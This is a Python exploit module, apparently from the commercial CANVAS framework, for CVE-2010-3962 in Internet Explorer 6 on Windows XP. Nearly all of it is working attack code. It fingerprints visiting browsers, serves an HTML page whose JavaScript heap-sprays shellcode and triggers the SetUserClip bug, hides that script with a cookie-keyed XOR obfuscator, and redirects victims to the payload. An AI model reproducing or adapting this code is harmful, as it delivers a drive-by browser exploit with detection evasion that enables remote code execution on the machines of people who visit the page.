#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

NAME='ie_setuserclip'
DESCRIPTION='IE SetUserClip'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='11/04/2010'
DOCUMENTATION['VersionsAffected']='IE 6, 7, 8'
DOCUMENTATION['CVE Name'] = 'CVE-2010-3962'
DOCUMENTATION['Notes'] = """
This bug was discovered in the wild.
IE6, 7 and 8 are vulnerable to this bug, but because of its behaviour some versions will not be exploitable.
The only full patched IE that i found vulnerable was IE6, but diserves more research on other ways to trigger it.

The behaviour of this bug is:
object[0] |= 0x1
So this way we OR the vtable and as it is aligned, it has the effect of vtable = vtable+1.
Then when we call any function of the vtable it is defaced by one, so we just call different regions
of memory depending on the version of mshtml.
"""

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP'] #Not tested on anything but a XP for the moment
#PROPERTY['MSADV']='?'
PROPERTY['DELIVERY']='HTTP'
PROPERTY["Notes"] = """
This version of the ie_setuserclip exploit works agains Windows XP SP3 with IE6,
doesn't bypasses dep because we can't controll jump address.
It does not, however, support HTTP MOSDEF (due to shellcode size limitations).
It will need a lot of RAM to be available - if your VM/machine does not have
at least a Gig of ram it may fail.
"""

NOTES="""

Tested on:
Windows XP Professional  SP3 under IE 6 updated.

You may want to bump up the ram allocated to your VM if this exploit is not working for you.
"""

CHANGELOG="""
"""

import string, random
class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version=0
        self.name=NAME 
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        # Set up our javascript obfuscator, this could be done in httpclientside class
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        self.language = "" #"en-us" # uncomment this to default to English version
        self.plugin_info = None # we want clientd to give us a plugin dict
        
        #HTTPMOSDEF shellcode is 2100 bytes or so - our shellcode space is 2044 or so. 
        #XXX: We need to switch to SearchCode?
        self.nohttpmosdef = True 
        return

    # This is expecting an info_dict that is populated like so:
    #
    # info_dict['plugins'] = parse_plugin_data(plugins_dict)
    # info_dict['user_agent'] = clientheader.getStrValue(['User-Agent'])
    #
    # self.plugin_info comes from clientd in parse_plugin_data scrubbed format
    
    def is_vulnerable(self, info_dict):
        """
        Check to make sure this is something we want to run,
        in this case, it means "running IE6".
        """ 
        if "MSIE 6" in info_dict['user_agent']:
            #found language, and is IE6
            #high value because it is reliable and recent, will works on XP
            self.log("Found vulnerable target")
            return 90
        else:
            self.log("Not IE 6 - possibly vulnerable, but not to this exploit")
            self.log("User Agent: %s"%info_dict.get("user_agent"))
        #not ie 6 or we don't have the language
        return 0

    def makefile(self, request_header=None):
        """
        Makes the exploit HTML
        """
        self.getArgs()
        if request_header:
            self.log("Checking IE version from Request Header")
            if "MSIE 6" in request_header.getHeaderValue("User-Agent"):
                self.log("IE 6 detected")
            else:
                self.log("Not IE 6, try with other exploit")
                return ""

        if not hasattr(self, "shellcode") or not self.shellcode:
            self.log("Regenerating shellcode in makefile")
            self.createShellcode()
            
        filedata="""<html>     
    <body>         
    <script language="JavaScript">
    """

        script = """
    function spray()
    {
      var array = new Array();
      var ls = 0x7F0000;

      var shellcode = unescape("%u9090%u9090%u9090") +   unescape("SHELLCODE");

      var t = unescape("%u0d0d");
      var b = unescape("%u0d0d");
      while(b.length < (0x7fc-shellcode.length))  { 
            b+=t;
      }
      b = b + shellcode;

      b = b.substring(0,b.length); 

      while(b.length < ls/2) {
        b += b
      }

      var lh = b.substring(0,ls/2);
      delete b;

      for(i=0;i<270;i++) {
        array[i] = lh + lh + shellcode; 
      }
      return array;
    }

   function hexa(val) {
     var str=new Number(val).toString(16);
     while (str.length < 4)  str = "0" + str;
     return str;
   }


   function myescape(addr) {
      var str="";
      str="%u"+hexa(addr&0xffff)+"%u"+hexa((addr>>16)&0xffff);
      return str;
}

    function build_exploit() {
      sp = spray();
      document.write("<table style=position:absolute;clip:rect(0)>");
    }
    build_exploit()                                    
"""
        script = script.replace('SHELLCODE',urluencode(self.shellcode))
        filedata += self.jsObfuscator.obfuscate(script)
        filedata += """
    </script>  
  </body>
</html>
"""
        return filedata
        # 0x75c9c2b9

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        
        h=header('SERVER')
        b=body()
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            
            if self.is_vulnerable(self.plugin_info):
                self.log("This client is most likely vulnerable!")
                #check for IE 6
                if info_dict['user_agent'].count('MSIE 6'):
                    self.msie6 = True
                else:
                    self.msie6 = False     			            
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable (%s)"%self.plugin_info.get("language"))
                return None, None

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            sploitstring=self.makefile(request_header = clientheader)
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
            h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def neededListenerTypes(self):
        return self.clientSideListenerTypes()
        
    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")
        self.getarg("language")
        return
        
    def run(self):
        self.getArgs()
        
        # Build the html that triggers the vulnerability
        filedata=self.makefile()
        
        self.log('Opening %s for output'%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
